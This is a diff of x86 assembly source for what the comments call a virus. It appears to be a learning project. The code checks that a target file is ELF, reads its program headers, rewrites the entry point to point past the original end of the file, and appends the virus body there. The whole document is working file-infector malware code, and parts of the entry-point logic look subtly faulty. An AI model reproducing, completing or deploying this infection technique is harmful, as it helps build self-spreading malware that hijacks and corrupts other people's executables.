@@ -87,8 +87,10 @@ read eax, ebp, 80				; reads 80bytes from file of file descriptor(eax) into the 
 mov esi, ebp					; store header in esi
 add ebp, 84						; clean header from the stack
 
+
+
 ; check the file is ELF file
-mov dword ebx, esi
+mov ebx, esi
 inc ebx
 cmp byte [ebx], 69				; cmp e_ident[1] with 'E'
 jnz printErr
@@ -102,14 +104,38 @@ jne printErr
 ; find the size of the file, in order to use it as offset when writing virus
 mov eax, dword [ebp-4]          ; load file descriptor from stak
 lseek eax, 0, SEEK_END
+mov dword [ebp-16], eax			;store file zise on stack 
+
+; seek location of program headers
+mov eax, dword [ebp-4]
+lseek eax, 52, SEEK_SET
+
+; load program headers
+sub ebp, 44						; make room for program headers
+mov eax, dword	[ebp-4]
+read eax, ebp, 32				; reads 32bytes from file of file descriptor(eax) into the stack as a buffer (ebp)
+mov edi, ebp					; store program headers in esi
+add ebp, 44						; clean program headers from the stack
+
+add edi, 4						; move to virtual adress of the first entry in the program headers
+mov dword ebx, [edi]			; move to ebx the virtual adress which the file is loaded to in the memory
+add ebx, [ebp-16]				; add the the virtual adress the size of the file
+
+; change entry point
+mov eax, dword [ebp-4]			; get file descriptor
+test:
+lseek eax, 24, SEEK_SET			; get location of entry point address
+mov eax, dword [ebp-4]
+write eax, ebx, 4				; write the new address to instead of the old entry point file
+
 
 ; write the virus to the end of the file
 call get_my_loc
 sub ecx, next_i-_start
+mov eax, [ebp-4]
 write eax, ecx, virus_end-_start
 
 ; close the file
-test:
 mov eax, [ebp-4]
 close eax
 
